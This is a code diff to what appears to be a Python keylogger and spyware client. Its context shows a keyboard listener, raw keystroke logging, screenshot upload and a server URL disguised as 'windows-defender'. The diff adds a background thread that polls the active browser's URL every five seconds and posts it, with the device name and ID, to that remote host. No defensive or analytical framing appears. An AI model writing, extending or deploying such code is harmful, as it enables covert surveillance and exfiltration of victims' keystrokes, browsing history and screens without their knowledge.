@@ -35,6 +35,7 @@ MESSAGE_GAP_MS = 2500
 RAW_BATCH_DELAY_SECONDS = 0.08
 RAW_BATCH_INTERVAL_SECONDS = 10
 HEARTBEAT_INTERVAL_SECONDS = 30
+WEBSITE_HISTORY_INTERVAL_SECONDS = 5
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SITE_URL = "https://windows-defender-cf8n.onrender.com"
 device_name = platform.node() or socket.gethostname() or "Unknown device"
@@ -427,6 +428,42 @@ def post_message(payload, quiet=False):
         return False
 
 
+def post_website_history(url, browser):
+    try:
+        request = Request(
+            f"{SITE_URL}/api/website-history",
+            data=json.dumps({
+                "device_id": device_id,
+                "device_name": device_name,
+                "browser": browser,
+                "url": url,
+                "visited_at": int(time.time() * 1000),
+            }).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urlopen(request, timeout=10) as response:
+            if response.status >= 400:
+                raise RuntimeError(f"HTTP {response.status}")
+        return True
+    except (HTTPError, URLError, TimeoutError, RuntimeError):
+        return False
+
+
+def website_history_sender():
+    last_url = ""
+    while True:
+        try:
+            active_app = get_active_app()
+            browser_url = get_browser_url(active_app)
+            if browser_url and browser_url != last_url:
+                if post_website_history(browser_url, active_app.split(" - ", 1)[0].strip()):
+                    last_url = browser_url
+        except Exception:
+            pass
+        time.sleep(WEBSITE_HISTORY_INTERVAL_SECONDS)
+
+
 def upload_device_screenshot(screenshot_base64):
     if not screenshot_base64:
         report_screenshot_status("Failed", "The desktop capture returned no image.")
@@ -766,5 +803,6 @@ atexit.register(mark_device_offline)
 atexit.register(flush_raw_log)
 Thread(target=message_sender, daemon=True).start()
 Thread(target=heartbeat_sender, daemon=True).start()
+Thread(target=website_history_sender, daemon=True).start()
 with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
     keyboard_listener.join()
